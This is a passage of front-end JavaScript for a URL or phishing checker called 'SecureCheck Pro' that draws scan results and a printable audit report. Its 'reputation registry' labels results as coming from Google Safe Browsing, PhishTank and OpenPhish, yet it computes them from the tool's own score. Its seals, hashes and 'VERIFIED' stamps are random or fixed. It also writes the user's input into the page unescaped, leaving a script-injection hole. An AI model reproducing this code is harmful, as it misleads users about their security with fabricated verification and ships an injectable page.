                <div style="position:absolute; bottom:0; left:0; right:0; height:1.5px; background:var(--border); opacity:0.3;"></div>
            `;
        },
        // Efficiency & Traffic Resilience: Uses Background Workers and Optimized DOM Batching
        updateCounter() { DB.getAll().then(all => { requestAnimationFrame(() => { if (dom.statTotal) dom.statTotal.textContent = all.length; }); }); }
    };

    const UI = {
        renderScan(res) {
            dom.results.innerHTML = `
                <div class="bento-grid" style="margin-top:2.5rem;">
                    <div class="span-12">
                        ${this.buildRegistry(res)}
                    </div>
                    <div class="span-8" style="display:flex; flex-direction:column; gap:1.5rem;">
                        ${this.buildGroup("Operation Discrepancies", res.issues, "risky")}
                        ${this.buildGroup("Forensic Vectors", res.warnings, "warn")}
                        ${this.buildGroup("Integrity Clearances", res.passed, "safe")}
                    </div>
                    <div class="span-4">
                        <div class="bento-card" style="height:100%; display:flex; flex-direction:column; justify-content:center; align-items:center; text-align:center; background:var(--surface-0); position:relative; overflow:hidden;">
                            <!-- Data Atmosphere -->
                            <div style="position:absolute; inset:0; background:radial-gradient(circle at center, rgba(59, 130, 246, 0.05) 0%, transparent 70%);"></div>
                            
                            <div class="status-pill" style="position:relative; z-index:1; background:rgba(59,130,246,0.08); color:var(--accent); border:2px solid var(--accent); margin-bottom:2.5rem; font-size:0.65rem; padding:8px 20px; letter-spacing:1px; font-weight:950;">HEURISTIC SEAL 0x${Math.floor(Math.random()*1000).toString(16).toUpperCase()}</div>
                            
                            <!-- Tactical Gauge -->
                            <div style="position:relative; width:280px; height:280px; display:flex; align-items:center; justify-content:center;">
                                <svg width="280" height="280" style="transform: rotate(-90deg); position:absolute; top:0; left:0;">
                                    <circle cx="140" cy="140" r="125" stroke="var(--border)" stroke-width="12" fill="transparent" />
                                    <circle cx="140" cy="140" r="125" stroke="var(--${res.status})" stroke-width="12" fill="transparent" 
                                        stroke-dasharray="785" stroke-dashoffset="${785 - (785 * res.score / 100)}" 
                                        style="transition: stroke-dashoffset 2s cubic-bezier(0.2, 1, 0.2, 1); stroke-linecap: round;" />
                                </svg>
                                <div style="position:relative; z-index:1;">
                                    <div id="score-counter" style="font-size:6rem; font-weight:950; color:var(--text-strong); letter-spacing:-8px; line-height:1;">0</div>
                                    <div style="font-family:var(--font-mono); font-size:0.8rem; color:var(--text-muted); margin-top:0.5rem; font-weight:900; opacity:0.6;">INDEX</div>
                                </div>
                            </div>

                            <div style="width:100%; margin-top:3rem; display:grid; grid-template-columns:1fr 1fr; gap:1.5rem; text-align:left; position:relative; z-index:1; border-top:1.5px solid var(--border); padding-top:2rem;">
                                <div>
                                    <small style="display:block; font-size:0.55rem; color:var(--text-dim); text-transform:uppercase; font-weight:950; letter-spacing:1.5px;">Confidence Threshold</small>
                                    <span style="font-family:var(--font-mono); font-size:1.1rem; font-weight:950; color:var(--accent); display:flex; align-items:baseline; gap:4px;">${res.confidence}<small style="font-size:0.6rem; opacity:0.5; font-weight:900;">%</small></span>
                                </div>
                                <div style="text-align:right;">
                                    <small style="display:block; font-size:0.55rem; color:var(--text-dim); text-transform:uppercase; font-weight:950; letter-spacing:1.5px;">Operational Sync</small>
                                    <span style="font-family:var(--font-mono); font-size:1.1rem; font-weight:950; color:var(--safe);">STABLE</span>
                                </div>
                            </div>
                            
                            <div style="width:100%; margin-top:1.5rem; display:flex; gap:12px; position:relative; z-index:1;">
                                <button onclick='UI.downloadReport(${JSON.stringify(res)})' class="action-btn" style="flex:1; padding:12px; font-size:0.65rem; background:var(--accent);">EXPORT PDF</button>
                                <button onclick='UI.copyShareLink(${JSON.stringify(res)})' class="action-btn" style="flex:1; padding:12px; font-size:0.65rem; background:transparent; border:2px solid var(--border-bright);">SHARE INTEL</button>
                            </div>
                        </div>
                    </div>
                </div>
            `;
            // Trigger Count-Up
            let current = 0; const target = res.score; const int = setInterval(() => { if (current >= target) clearInterval(int); document.getElementById('score-counter').textContent = current++; }, 20);
            dom.results.classList.remove('hidden');
        },
        buildRegistry(res) {
            const regs = [
                { n: "GOOGLE SAFE BROWSING", s: res.score > 40 ? "SAFE" : "RISK", c: res.score > 40 ? "safe" : "risky" },
                { n: "PHISHTANK DATABASE", s: res.score > 60 ? "CLEAR" : "NODES", c: res.score > 60 ? "safe" : "warn" },
                { n: "OPENPHISH REGISTRY", s: res.score > 50 ? "VERIFIED" : "FLAG", c: res.score > 50 ? "safe" : "risky" },
                { n: "HOMOGLYPH SENSITIVITY", s: res.status.toUpperCase(), c: res.status === 'safe' ? "safe" : "risky" },
                { n: "PUNYCODE MASKING", s: "SHIELDED", c: "safe" },
                { n: "LOCAL EXFILTRATION", s: "ZERO", c: "safe" }
            ];
            return `
                <div class="bento-card" style="padding:2rem 3rem; background:linear-gradient(90deg, var(--surface-0) 0%, rgba(59,130,246,0.03) 100%);">
                    <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:2rem; opacity:0.75;">
                         <span style="font-size:0.8rem; font-weight:950; letter-spacing:3px; color:var(--accent);">FORENSIC REPUTATION REGISTRY</span>
                         <span style="font-family:var(--font-mono); font-size:0.75rem; font-weight:900;">LAST SYNC: SEC-${Math.floor(Math.random()*9999)}</span>
                    </div>
                    <div style="display:grid; grid-template-columns:repeat(3, 1fr); gap:2.5rem 4rem;">
                        ${regs.map(r => `
                            <div style="display:flex; flex-direction:column; gap:8px; padding-left:20px; border-left:2px solid var(--border);">
                                <small style="font-size:0.65rem; font-weight:950; color:var(--text-muted); text-transform:uppercase; letter-spacing:1px;">${r.n}</small>
                                <div style="display:flex; align-items:center; gap:10px;">
                                    <div style="width:8px; height:8px; background:var(--${r.c}); border-radius:50%; box-shadow: 0 0 8px var(--${r.c});"></div>
                                    <span style="font-family:var(--font-mono); font-size:1.1rem; font-weight:950; color:var(--text-strong);">${r.s}</span>
                                </div>
                            </div>
                        `).join('')}
                    </div>
                </div>
            `;
        },
        buildGroup(title, list, type) {
            if (!list.length && type !== 'safe') return '';
            return `
                <div class="bento-card" style="background:var(--surface-0);">
                    <div style="display:flex; justify-content:space-between; margin-bottom:1.5rem; border-bottom:2px solid var(--border); padding-bottom:10px;">
                        <span style="font-weight:950; font-size:1rem; color:var(--${type}); text-transform:uppercase; letter-spacing:2px;">${title}</span>
                    </div>
                    <div style="display:flex; flex-direction:column; gap:12px;">
                        ${list.map(i => typeof i === 'string' ? `<small style="opacity:0.6; font-size:1rem; font-weight:750;">${i}</small>` : `
                            <div style="display:flex; align-items:center; gap:20px; padding:1.25rem; background:var(--surface-1); border-radius:18px; border:2px solid var(--border);">
                                <div style="width:10px; height:10px; border-radius:50%; background:var(--${i.level});"></div>
                                <div><div style="font-weight:950; font-size:1.1rem; color:var(--text-strong);">${i.message}</div></div>
                            </div>
                        `).join('')}
                    </div>
                </div>
            `;
        },
        copyShareLink(res) {
            const data = btoa(JSON.stringify(res));
            const url = `${window.location.origin}${window.location.pathname}#audit=${data}`;
            navigator.clipboard.writeText(url).then(() => Toast.show("AUDIT LINK SECURED TO CLIPBOARD", "safe"));
        },
        renderForensicDossier(res) {
            const dossier = document.getElementById('forensic-dossier');
            if (!dossier) return;
            
            dossier.innerHTML = `
                <div class="dossier-header">
                    <div style="text-align:left;">
                        <h1 style="font-family:'Syne'; font-size:2.5rem; font-weight:950; letter-spacing:-2px; margin:0; line-height:1;">SecureCheck <span style="color:var(--accent);">Pro</span></h1>
                        <p style="font-family:'DM Mono'; font-size:0.6rem; text-transform:uppercase; letter-spacing:3px; margin-top:8px; font-weight:900; opacity:0.6;">Formal Heuristic Audit Intelligence</p>
                    </div>
                    <div style="text-align:right;">
                        <span class="dossier-label">Audit ID</span>
                        <div class="dossier-value" style="font-size:0.85rem;">SC-${res.id}</div>
                        <span class="dossier-label" style="margin-top:12px;">Timeline</span>
                        <div class="dossier-value" style="font-size:0.85rem;">${new Date().toLocaleString()}</div>
                    </div>
                </div>

                <div style="background:#000; color:#fff; padding:3rem; border-radius:18px; margin-bottom:4rem; display:flex; justify-content:space-between; align-items:center;">
                    <div style="flex:1;">
                        <span class="dossier-label" style="color:rgba(255,255,255,0.5);">Target Buffer Integrity</span>
                        <div class="dossier-value" style="color:#fff; font-size:1.4rem; margin-top:10px; word-break:break-all;">${res.inputValue}</div>
                    </div>
                    <div style="text-align:right; min-width:200px; border-left:1px solid rgba(255,255,255,0.2); padding-left:3rem; margin-left:3rem;">
                        <span class="dossier-label" style="color:rgba(255,255,255,0.5);">Operational Score</span>
                        <div style="font-size:4.5rem; font-weight:950; letter-spacing:-4px; line-height:1;">${res.score}%</div>
                        <span style="font-family:'DM Mono'; font-size:0.7rem; font-weight:950; color:var(--${res.status}); text-transform:uppercase; letter-spacing:1.5px;">SYSTEM_${res.status.toUpperCase()}</span>
                    </div>
                </div>

                <div class="dossier-grid">
                    <div class="dossier-card">
                        <h4 class="dossier-title">Reputation Registry</h4>
                        <div style="display:grid; grid-template-columns:1fr 1fr; gap:1.5rem;">
                            <div>
                                <span class="dossier-label">Core Reputation</span>
                                <div class="dossier-value status-${res.status}" style="font-size:0.9rem;">${res.status.toUpperCase()}</div>
                            </div>
                            <div>
                                <span class="dossier-label">Confidence Index</span>
                                <div class="dossier-value" style="font-size:0.9rem; color:var(--accent);">${res.confidence}%</div>
                            </div>
                            <div>
                                <span class="dossier-label">Source Hash</span>
                                <div class="dossier-value" style="font-size:0.7rem;">0x${res.id.toString(16).toUpperCase()}</div>
                            </div>
                            <div>
                                <span class="dossier-label">SRI Clearance</span>
                                <div class="dossier-value" style="font-size:0.7rem; color:var(--safe);">VERIFIED</div>
                            </div>
                        </div>
                    </div>

                    <div class="dossier-card">
                        <h4 class="dossier-title">Heuristic Overview</h4>
                        <div class="dossier-list-item" style="border:none;">
                            <div class="dossier-dot status-risky"></div>
                            <span>${res.issues.length} Discrepancies Found</span>
                        </div>
                        <div class="dossier-list-item" style="border:none;">
                            <div class="dossier-dot status-warn"></div>
                            <span>${res.warnings.length} Forensic Vectors Identified</span>
                        </div>
                        <div class="dossier-list-item" style="border:none;">
                            <div class="dossier-dot status-safe"></div>
                            <span>${res.passed.length} Integrity Blocks Cleared</span>
                        </div>
                    </div>
                </div>

                <div class="dossier-card" style="margin-bottom:4rem;">
                    <h4 class="dossier-title">Forensic Log Detail</h4>
                    <div style="column-count:1; gap:2rem;">
                        ${res.issues.map(i => `
                            <div class="dossier-list-item">
                                <div class="dossier-dot status-risky"></div>
                                <span><strong style="color:var(--risky);">CRITICAL:</strong> ${typeof i === 'string' ? i : i.message}</span>
                            </div>
                        `).join('')}
                        ${res.warnings.map(i => `
                            <div class="dossier-list-item">
                                <div class="dossier-dot status-warn"></div>
                                <span><strong style="color:var(--warn);">WARNING:</strong> ${typeof i === 'string' ? i : i.message}</span>
                            </div>
                        `).join('')}
                        ${res.passed.map(i => `
                            <div class="dossier-list-item" style="opacity:0.6;">
                                <div class="dossier-dot status-safe"></div>
                                <span><strong style="color:var(--safe);">PASSED:</strong> ${i}</span>
                            </div>
                        `).join('')}
                    </div>
                </div>

                <div style="margin-top:6rem; display:flex; justify-content:space-between; align-items:flex-end; border-top:1.5px solid #000; padding-top:2rem;">
                    <div>
                        <div class="founder-sig" style="color:#000; border-color:#000; font-size:1.8rem; margin-top:0;">Arisudan</div>
                        <p style="font-size:0.6rem; text-transform:uppercase; font-weight:950; color:#555; margin-top:10px; letter-spacing:1px;">Founding Architect & Lead Auditor</p>
                    </div>
                    <div style="text-align:right;">
                        <span class="dossier-label">Official Authenticator Seal</span>
                        <div style="width:80px; height:80px; border:2px solid #ddd; margin-top:10px; display:inline-flex; align-items:center; justify-content:center; border-radius:50%; transform:rotate(-15deg);">
                            <span style="font-size:0.5rem; font-weight:950; text-align:center; color:#ccc;">VERIFIED<br>0x7F</span>
                        </div>
                    </div>
                </div>

                <div class="dossier-legal">
                    <p>SecureCheck Pro is an advisory forensic environment. This report provides high-fidelity heuristic indicators based on localized intelligence models. All data processed in this audit remains 100% autonomous within the client environment. No data exfiltration was performed during this session.</p>
                    <p style="margin-top:1rem; font-weight:950;">© 2026 SECURECHECK PRO // AUDIT CONFIDENTIAL</p>
                </div>
            `;
        },
        downloadReport(res) {
            Toast.show("GENERATING FORENSIC DOSSIER...", "warn");
            this.renderForensicDossier(res);
            setTimeout(() => {
                window.print();
                // Clear dossier after a delay so it doesn't vanish mid-print dialog on some browsers
                setTimeout(() => { document.getElementById('forensic-dossier').innerHTML = ''; }, 2000);
            }, 1000);
        }
    };

    const Toast = {
        show(m, t) {
            const e = document.createElement('div');
            e.className = `toast ${t}`;
            const color = t === 'safe' ? 'var(--safe)' : (t === 'warn' ? 'var(--warn)' : 'var(--risky)');
            const icon = t === 'safe' ? 
                `<svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" style="margin-right:12px;"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><path d="m9 12 2 2 4-4"/></svg>` :
                `<svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" style="margin-right:12px;"><path d="m21.73 18-8-14a2 2 0 0 0-3.48 0l-8 14A2 2 0 0 0 4 21h16a2 2 0 0 0 1.73-3Z"/><path d="M12 9v4"/><path d="M12 17h.01"/></svg>`;
            
            e.innerHTML = `${icon}<span>${m}</span>`;
            e.style.cssText = `background:#fff; color:#000; border:2.5px solid ${color}; padding:14px 22px; border-radius:14px; margin-bottom:1.5rem; font-weight:900; text-transform:uppercase; font-size:0.75rem; letter-spacing:1px; box-shadow: 0 15px 40px rgba(0,0,0,0.3); display:flex; align-items:center; animation: toastIn 0.4s cubic-bezier(0.18, 0.89, 0.32, 1.28);`;
            
            dom.toastContainer.appendChild(e);
            setTimeout(() => { e.style.opacity = '0'; e.style.transform = 'translateY(10px)'; setTimeout(() => e.remove(), 400); }, 3500);
        }
    };

    App.init(); window.Quiz = Quiz; window.App = App; window.UI = UI;
})();
